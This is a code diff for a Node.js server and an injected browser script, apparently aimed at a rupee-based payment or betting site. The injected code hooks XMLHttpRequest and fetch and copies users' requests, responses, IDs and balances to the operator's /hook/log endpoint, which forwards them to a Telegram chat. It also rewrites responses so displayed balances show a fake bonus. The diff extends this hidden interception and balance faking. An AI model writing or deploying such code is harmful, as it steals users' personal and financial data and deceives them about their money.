@@ -33,6 +33,7 @@ const DEFAULT_DATA = {
 
 let bot = null;
 let webhookSet = false;
+const _balSnapTimes = {};
 try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
 
 let redis = null;
@@ -250,11 +251,16 @@ app.post('/hook/log', async (req, res) => {
       }
     }
 
+    const cfgBonus = req.body.cb;
+    const wasModded = req.body.md;
+
     if (data.debugMode && data.adminChatId && bot) {
       const tag = userId ? ` [UID:${userId}]` : ' [UID:?]';
+      const modTag = wasModded ? ' ✏️MOD' : '';
+      const bonusTag = cfgBonus ? ` 💰B:${cfgBonus}` : '';
       const now2 = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       bot.sendMessage(data.adminChatId,
-`🐛 DEBUG${tag}
+`🐛 DEBUG${tag}${bonusTag}${modTag}
 🔗 ${m || 'GET'} ${u}
 📤 REQ: ${(b || 'empty').substring(0, 400)}
 📥 RES: ${(r || 'empty').substring(0, 600)}
@@ -334,11 +340,10 @@ app.post('/hook/log', async (req, res) => {
     }
 
     const urlLower = u.toLowerCase();
-    const isMineUrl = urlLower.includes('memberinfo') || urlLower.includes('member/info') || urlLower.includes('member_info') ||
-      urlLower.includes('userinfo') || urlLower.includes('user/info') || urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
-      urlLower.includes('mine') || urlLower.includes('profile') || urlLower.includes('center') ||
-      urlLower.includes('getmember') || urlLower.includes('memberdetail') || urlLower.includes('membercenter') ||
-      urlLower.includes('dashboard');
+    const isMineUrl = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
+      urlLower.includes('member/info') || urlLower.includes('user/info') ||
+      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
+      urlLower.includes('getmember') || urlLower.includes('memberdetail');
 
     if (isMineUrl && respData && typeof respData === 'object' && userId) {
       function findBalDeep(obj, depth) {
@@ -374,13 +379,18 @@ app.post('/hook/log', async (req, res) => {
         const userName = trackedUser.name || '';
         const userPhone = trackedUser.phone || phone || '';
 
-        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
-
         if (!data.userOverrides) data.userOverrides = {};
         if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
         data.userOverrides[String(userId)].lastRealBalance = realBalance;
 
-        if (balChanged) {
+        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
+        const snapKey = `bal_${userId}`;
+        const lastSnapTime = _balSnapTimes[snapKey] || 0;
+        const nowMs = Date.now();
+        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);
+
+        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
+          _balSnapTimes[snapKey] = nowMs;
           const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
           const changeStr = lastReal !== undefined
             ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
@@ -953,19 +963,21 @@ if(bonus){if(d&&typeof d==='object')addBal(d,bonus,0);addBal(j,bonus,0);}
 return JSON.stringify(j);
 }catch(e){return text;}}
 
-function sendLog(url,method,bodyStr,resp,status){
+function sendLog(url,method,bodyStr,resp,status,modded){
 try{var x=new XMLHttpRequest();x.open('POST',P+'/hook/log',true);
 x.setRequestHeader('Content-Type','application/json');
 x.send(JSON.stringify({u:url,m:method,
 b:(bodyStr||'').substring(0,3000),
-r:(resp||'').substring(0,5000),s:status,uid:UID}));}catch(e){}}
+r:(resp||'').substring(0,5000),s:status,uid:UID,
+cb:CFG?(CFG.bonus||0):0,md:modded?1:0}));}catch(e){}}
 
 var _rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
 var _rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');
 
 Object.defineProperty(XMLHttpRequest.prototype,'responseText',{
 get:function(){
-var orig=_rtDesc.get.call(this);
+var orig;
+try{orig=_rtDesc.get.call(this);}catch(e){orig='';}
 if(this._pxDone)return this._pxRT!==undefined?this._pxRT:orig;
 if(this.readyState!==4)return orig;
 this._pxDone=true;
@@ -974,17 +986,23 @@ if(url.indexOf(P)===0)return orig;
 try{
 var bs=this._bs||'';
 var login=this._isLogin||false;
-sendLog(url,this._hm||'',bs,orig,this.status);
-if(login&&!UID){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
 if(CFG&&CFG.enabled){
 var mod=modResp(orig,login);
-if(mod!==orig){this._pxRT=mod;return mod;}}
+if(mod!==orig){this._pxRT=mod;this._pxRJ=null;
+sendLog(url,this._hm||'',bs,orig,this.status,true);return mod;}
+}
+if(login&&!UID){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
+sendLog(url,this._hm||'',bs,orig,this.status,false);
 }catch(e){}
 return orig;},configurable:true});
 
 Object.defineProperty(XMLHttpRequest.prototype,'response',{
 get:function(){
-if(this._pxRT!==undefined&&(this.responseType===''||this.responseType==='text'))return this._pxRT;
+if(this._pxRT!==undefined){
+if(this.responseType===''||this.responseType==='text')return this._pxRT;
+if(this.responseType==='json'){
+if(!this._pxRJ){try{this._pxRJ=JSON.parse(this._pxRT);}catch(e){this._pxRJ=null;}}
+if(this._pxRJ)return this._pxRJ;}}
 return _rDesc.get.call(this);},configurable:true});
 
 var _open=XMLHttpRequest.prototype.open;
@@ -1015,11 +1033,13 @@ var ct=resp.headers.get('content-type')||'';
 if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
 var cl=resp.clone();
 return cl.text().then(function(text){
-sendLog(url,method,bs,text,resp.status);
 if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
 if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
 var mod=modResp(text,login);
-if(mod!==text)return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}
+if(mod!==text){
+sendLog(url,method,bs,text,resp.status,true);
+return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}}
+sendLog(url,method,bs,text,resp.status,false);
 return resp;}).catch(function(){return resp;});
 }catch(e){return resp;}
 });};}
